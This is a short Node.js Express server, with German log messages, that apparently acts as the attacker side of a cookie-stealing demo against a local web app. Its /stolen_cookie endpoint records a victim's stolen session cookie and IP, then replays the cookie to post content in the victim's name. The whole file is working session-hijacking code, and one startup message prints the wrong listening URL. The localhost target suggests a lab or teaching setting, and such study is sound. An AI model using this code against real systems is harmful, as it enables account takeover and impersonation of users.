import express from "express";
import fetch from "node-fetch";
const app = express();
const port = 8080;

const TARGET_APP_URL = "http://127.0.0.1:3000";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get("/stolen_cookie", async (req, res) => {
  const stolenCookie = req.query.cookie;
  const victimIp = req.ip;
  const timestamp = new Date().toISOString();

  if (stolenCookie) {
    console.log(
      `\n[${timestamp}] STOLENES COOKIE EMPFANGEN von IP: ${victimIp}:`
    );
    console.log(`Cookie: ${stolenCookie}`);

    const fakePostContent =
      `🚨 ACHTUNG: Session gekapert! Dieser Post wurde von einem Angreifer im Namen des Opfers erstellt. ` +
      `Gestohlene Cookie: ${stolenCookie.substring(0, 30)}... (gekürzt)`;

    try {
      const response = await fetch(`${TARGET_APP_URL}/addpost`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Cookie: stolenCookie,
        },
        body: `content=${encodeURIComponent(fakePostContent)}`,
      });

      if (response.ok) {
        console.log(
          `[${timestamp}] ERFOLG: Fake Post im Namen des Opfers erstellt.`
        );
      } else {
        console.error(
          `[${timestamp}] FEHLER: Konnte Fake Post nicht erstellen. Status: ${response.status}`
        );
        const errorText = await response.text();
        console.error(`Fehlerdetails: ${errorText}`);
      }
    } catch (error) {
      console.error(
        `[${timestamp}] EXCEPTION: Fehler beim Senden des Fake Posts:`,
        error.message
      );
    }

    res.send("Cookie empfangen und Aktion ausgeführt!");
  } else {
    res.send("Nichts empfangen.");
  }
});

app.listen(port, () => {
  console.log(`Angreiferserver läuft auf http://127.0.0.1:${port}`);
  console.log(
    `Warte auf gestohlene Cookies unter ${TARGET_APP_URL}/stolen_cookie`
  );
});
